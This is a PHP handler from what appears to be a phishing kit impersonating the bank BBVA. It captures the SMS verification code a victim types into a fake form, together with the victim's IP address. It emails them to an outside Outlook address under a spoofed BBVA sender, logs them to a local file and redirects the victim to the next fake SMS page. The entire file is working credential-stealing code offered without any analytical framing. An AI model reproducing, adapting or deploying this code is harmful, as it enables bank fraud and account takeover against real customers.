<?php
$ip = $_SERVER['REMOTE_ADDR'];
$agent=$_SERVER['HTTP_USER_AGENT'];


$message .= "-----|BBVA SMS 1|-----\n";
$message .= "SMS 1		: ".$_POST['signatureData']."\n";
$message .= "--------------------\n";
$index="mpanel.html"; //the name of index or rediretion file
$lnk = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]/$index";
$show = preg_replace('/sms1.php/', '', $lnk);
$message .= "$show\n";
$message .= "------------------------\n";
$message .= "IP  : ".$ip."\n";
$to = "frank24156@outlook.com";
$subj = "BBVA SMS 1".$ip."\n";
$from = "From:BBVA <info@agricole.net>";
mail($to, $subj, $message, $from);

$n = fopen('../ip.txt','a');
fwrite($n,$message );
fclose($n);

@header("Location: loadSms2.html");
?>